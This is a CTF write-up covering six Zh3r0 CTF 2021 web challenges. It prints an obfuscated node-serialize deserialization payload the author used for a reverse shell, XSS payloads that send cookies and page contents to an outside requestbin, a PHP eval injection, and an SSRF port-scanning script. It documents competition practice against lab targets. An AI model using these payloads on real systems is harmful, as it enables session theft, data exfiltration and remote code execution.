![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-06-06%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.29.44.png?raw=true)

This weekend, [Peter](http://reteps.github.io/) and I participated in the Zh3r0 CTF V2 as `icypete` team. I only solved the many web challenge and He solved the web and misc. I had fun and finally got 31st place.

---
## (Web) sparta [100 pts]

> The sparta challenge is using the simple deserialization RCE vulnerability in node.js

```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var bodyParser = require('body-parser');
var app = express();
var path = require('path');
app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');

app.get('/', (req,res) => {
	res.render('home.ejs');
});

app.post('/', (req,res) => {
	res.render('loggedin.ejs')
});

app.get('/guest', function(req, res) {
   res.render('guest.ejs');
});

app.post('/guest', function(req, res) {
   if (req.cookies.guest) {
   	var str = new Buffer(req.cookies.guest, 'base64').toString();
   	var obj = serialize.unserialize(str);
   	if (obj.username) {
     	res.send("Hello " + escape(obj.username) + ". This page is currently under maintenance for Guest users. Please go back to the login page");
   }
 } else {
	 var username = req.body.username 
	 var country = req.body.country 
	 var city = req.body.city
	 var serialized_info = `{"username":"${username}","country":"${country}","city":"${city}"}`
     var encoded_data = new Buffer(serialized_info).toString('base64');
	 res.cookie('guest', encoded_data, {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello!");
});
app.listen(process.env.PORT || 7777);
console.log("Listening on port 7777...");
```
Look at the above code, You can see using the `unserialize()` method. `unserialize()` method is very vulnerable to `deserialization RCE`. But Server is very vulnerable because `not filtering` the argument(req.cookies.guest).

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/sparta/poc.png?raw=true)

Look at the above photo, You can see occurring the RCE.

```
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSwxMTAsMTAxLDExNiwzOSw0MSw1OSwxMCwxMTgsOTcsMTE0LDMyLDExNSwxMTIsOTcsMTE5LDExMCwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDExNSwxMTIsOTcsMTE5LDExMCw1OSwxMCw3Miw3OSw4Myw4NCw2MSwzNCw0OSw1Miw0OSw0Niw0OSw1NCw1Miw0Niw1Myw1MCw0Niw1MCw0OCw1NSwzNCw1OSwxMCw4MCw3OSw4Miw4NCw2MSwzNCw1Niw0OCwzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9KCkifQ==
```
So, I get the reverse shell using the above poc code and read /flag.txt

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/sparta/flag.png?raw=true)

```
zh3r0{4ll_y0u_h4d_t0_d0_w4s_m0v3_th3_0bjc3ts_3mper0r}
```

---
## (Web) bxss [100 pts]

> The bxss challenge is steal flag in /flag using the Reflected XSS.

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/check%20flag.png?raw=true)

First, When I send a request with /flag, able see the flag by only admin.

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/feedback.png?raw=true)

```html
<script>location.href = "https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net"</script>
```
When I look at the feedback page, I able enter the feedback content. I'm just wondering and enter the above script and requested.

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/request%201.png?raw=true)

I checked the requestbin and I saw that the receive the request in requestbin.

```html
<script>
    fetch("/flag").then((x) => x.text()).then((x) => fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/?a=" + x));
</script>
```
I immediately sent the above payload and read /flag

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/bxss/request%202.png?raw=true)

```
zh3r0{{Ea5y_bx55_ri8}}
```

---
## (Web) strpos and substr [395 pts]

> The strpos and substr challenge is get flag using the simple RCE. But a lot of filtering.

```php
eval("echo 'hello';`ls`");

eval("echo 'hello',`ls`");
```
Above two payloads are same. So, I bypassed the `;` to `,`

```
',system  ('head /*' ),'
```

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/strpos%20and%20substr/1.png?raw=true)

```
zh3r0{W4RmUp_4_Fun_13333333337}
```

---
## (Web) Original Store [842 pts]

> The Original Store challenge is steal admin cookie using the Reflected XSS. I solved using the unintended exploit

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/1.png?raw=true)

First, I sign up and login

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/2.png?raw=true)

After logging in, looking at the functions, there were not many. So When I go to /account.php, here checked the user information. When I went to /account.php, I thought I should check the user information after login as admin. So, I decided to steal the admin cookie using the xss and use it to check the /account.php.

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/4.png?raw=true)

```
url : https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net
```
When I checked requestbin after sent the above url on the `http://35.200.166.215:5556/`, I was able to confirm that the request was received.

So, I uploaded the xss poc to the private server and tried to attack, but it didn't work...

```html
location.href = URL;
```
Hm.. I thought that the server would handle it as above. So I just tried xss using `javascript:` scheme.

```js
javascript:(()=>{window.location=`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net?${document.cookie}`})()
```
So I just tried xss using as above `javascript:` scheme.

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/5.png?raw=true)

When I checked requestbin, Well was steal admin cookie. So I send a request to /account.php using the admin cookie.

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/6.png?raw=true)

Nice I got the flag.

```
zh3r0{4dm1n_l0ves_0nly_0r1g1n4ls_br0}
```

---
## (Web) Original Store v2 [871 pts]

> The Original Store v2 challenge is steal document, not admin cookie on the user page /account.php using the Reflected XSS because set the httponly option on the cookie. I solved using the unintended exploit

Original Store v2 is the same as Original Store. The difference is can not steal the admin cookie. Maybe Was set the `httponly` options..

```js
javascript:(()=>{fetch('/account.php').then((x)=>x.text()).then((x)=>fetch(`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net?${x}`))})()
```

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store%20V2/1.png?raw=true)

```
zh3r0{4dm1n_h4tes_car_st34l3rs_br0}
```

---
## (Web) Baby SSRF [453 pts]

> The Baby SSRF challenge is find a port using the brute forcing and enter the internal server ip:port

```
for i in range(5000,10000)

xD
```
The organizer provided the above hint. The hint is mean to make the port random for range 5000 to 10000. So first I should find the port using the brute forcing and send a url using the ssrf  vulnerability.

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Baby%20SSRF/waf.png?raw=true)

If you enter the localhost/127.0.0.1, You can check the filtering. But I can bypass 127.0.0.1 to 0x7f000001.

```python
import requests
from sys import exit
from pwn import *
from threading import Thread

url = "http://web.zh3r0.cf:6969/request"

def a(s, e):
    global localhost
    for i in range(s,e):
        data = {"url":"http://0x7f000001:{}".format(i)}
        res = requests.post(url, data=data).text
        if "Learn about URL" not in res and "Please dont try to heck me sir..." not in res:
            flag = res.split('&#39;')
            for s in flag:
                if 'zh3r0{' in s:
                    log.info("The internal Server is {}".format(data['url']))
                    log.info("The flag is {}".format(s))
                    break

if __name__ == "__main__":
    log.info("Exploit")
    th1 = Thread(target=a, args=(8001, 9000))
    th2 = Thread(target=a, args=(9001, 10000))

    th1.start()
    th2.start()
```
I wrote the above poc code.

![](https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Baby%20SSRF/1.png?raw=true)

I execute the poc code and I can see the flag.

```
zh3r0{SSRF_0r_wh4t3v3r_ch4ll3ng3}
```

---
